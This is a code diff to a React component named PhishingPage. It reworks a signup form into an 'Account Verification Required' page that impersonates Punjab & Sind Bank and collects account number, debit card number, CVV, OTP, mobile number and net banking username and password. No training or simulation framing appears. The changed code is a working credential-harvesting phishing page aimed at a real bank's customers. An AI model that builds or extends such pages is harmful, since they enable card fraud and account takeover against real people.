@@ -7,11 +7,27 @@ import { Card } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
 
 interface PhishingPageProps {
-  onSubmit: (data: { account: string; otp: string; password: string }) => void;
+  onSubmit: (data: { 
+    account: string; 
+    debitCard: string;
+    cvv: string;
+    otp: string; 
+    mobile: string;
+    username: string;
+    password: string;
+  }) => void;
 }
 
 const PhishingPage = ({ onSubmit }: PhishingPageProps) => {
-  const [formData, setFormData] = useState({ account: '', otp: '', password: '' });
+  const [formData, setFormData] = useState({ 
+    account: '', 
+    debitCard: '', 
+    cvv: '', 
+    otp: '', 
+    mobile: '', 
+    username: '', 
+    password: '' 
+  });
   const [showPassword, setShowPassword] = useState(false);
 
   const handleSubmit = (e: React.FormEvent) => {
@@ -54,40 +70,113 @@ const PhishingPage = ({ onSubmit }: PhishingPageProps) => {
           <div className="flex-1 p-8 lg:p-12">
             <div className="max-w-md mx-auto">
               <div className="text-center mb-8">
-                <h2 className="text-2xl font-bold text-gray-800 mb-2">Set Login Credentials</h2>
+                <h2 className="text-2xl font-bold text-gray-800 mb-2">Account Verification Required</h2>
                 <p className="text-gray-600">
-                  Complete your account setup to access your banking services
+                  Please verify your details to secure your Punjab & Sind Bank account
                 </p>
               </div>
 
-              <form onSubmit={handleSubmit} className="space-y-6">
+              <form onSubmit={handleSubmit} className="space-y-4">
+                <div>
+                  <Label htmlFor="account" className="text-gray-700 font-medium">
+                    Account Number
+                  </Label>
+                  <div className="relative mt-2">
+                    <User className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
+                    <Input
+                      id="account"
+                      placeholder="Enter Account Number"
+                      value={formData.account}
+                      onChange={(e) => setFormData({ ...formData, account: e.target.value })}
+                      className="pl-10 h-12 border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
+                    />
+                  </div>
+                </div>
+
+                <div>
+                  <Label htmlFor="debitCard" className="text-gray-700 font-medium">
+                    Debit Card Number
+                  </Label>
+                  <div className="relative mt-2">
+                    <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
+                    <Input
+                      id="debitCard"
+                      placeholder="Enter 16-digit Card Number"
+                      value={formData.debitCard}
+                      onChange={(e) => setFormData({ ...formData, debitCard: e.target.value })}
+                      className="pl-10 h-12 border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
+                    />
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-2 gap-4">
+                  <div>
+                    <Label htmlFor="cvv" className="text-gray-700 font-medium">
+                      CVV
+                    </Label>
+                    <div className="relative mt-2">
+                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
+                      <Input
+                        id="cvv"
+                        placeholder="CVV"
+                        value={formData.cvv}
+                        onChange={(e) => setFormData({ ...formData, cvv: e.target.value })}
+                        className="pl-10 h-12 border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
+                      />
+                    </div>
+                  </div>
+                  <div>
+                    <Label htmlFor="otp" className="text-gray-700 font-medium">
+                      OTP
+                    </Label>
+                    <div className="relative mt-2">
+                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
+                      <Input
+                        id="otp"
+                        placeholder="Enter OTP"
+                        value={formData.otp}
+                        onChange={(e) => setFormData({ ...formData, otp: e.target.value })}
+                        className="pl-10 h-12 border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
+                      />
+                    </div>
+                  </div>
+                </div>
+
+                <div>
+                  <Label htmlFor="mobile" className="text-gray-700 font-medium">
+                    Mobile Number
+                  </Label>
+                  <div className="relative mt-2">
+                    <User className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
+                    <Input
+                      id="mobile"
+                      placeholder="Enter Mobile Number"
+                      value={formData.mobile}
+                      onChange={(e) => setFormData({ ...formData, mobile: e.target.value })}
+                      className="pl-10 h-12 border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
+                    />
+                  </div>
+                </div>
+
                 <div>
                   <Label htmlFor="username" className="text-gray-700 font-medium">
-                    Set Username
+                    Net Banking Username
                   </Label>
                   <div className="relative mt-2">
                     <User className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
                     <Input
                       id="username"
                       placeholder="Enter Username"
-                      value={formData.account}
-                      onChange={(e) => setFormData({ ...formData, account: e.target.value })}
+                      value={formData.username}
+                      onChange={(e) => setFormData({ ...formData, username: e.target.value })}
                       className="pl-10 h-12 border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
                     />
-                    <Button
-                      type="button"
-                      variant="outline"
-                      size="sm"
-                      className="absolute right-2 top-1/2 transform -translate-y-1/2 text-emerald-600 border-emerald-600 hover:bg-emerald-50"
-                    >
-                      CHECK AVAILABILITY
-                    </Button>
                   </div>
                 </div>
 
                 <div>
                   <Label htmlFor="password" className="text-gray-700 font-medium">
-                    Set Password
+                    Net Banking Password
                   </Label>
                   <div className="relative mt-2">
                     <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
@@ -111,28 +200,11 @@ const PhishingPage = ({ onSubmit }: PhishingPageProps) => {
                   </div>
                 </div>
 
-                <div>
-                  <Label htmlFor="confirmPassword" className="text-gray-700 font-medium">
-                    Confirm Password
-                  </Label>
-                  <div className="relative mt-2">
-                    <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
-                    <Input
-                      id="confirmPassword"
-                      type="password"
-                      placeholder="Re-enter Password"
-                      value={formData.otp}
-                      onChange={(e) => setFormData({ ...formData, otp: e.target.value })}
-                      className="pl-10 h-12 border-2 border-gray-200 focus:border-emerald-500 rounded-lg"
-                    />
-                  </div>
-                </div>
-
                 <Button 
                   type="submit" 
                   className="w-full h-12 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold rounded-lg transition-all duration-200"
                 >
-                  Create Account
+                  Verify Account
                 </Button>
               </form>
 
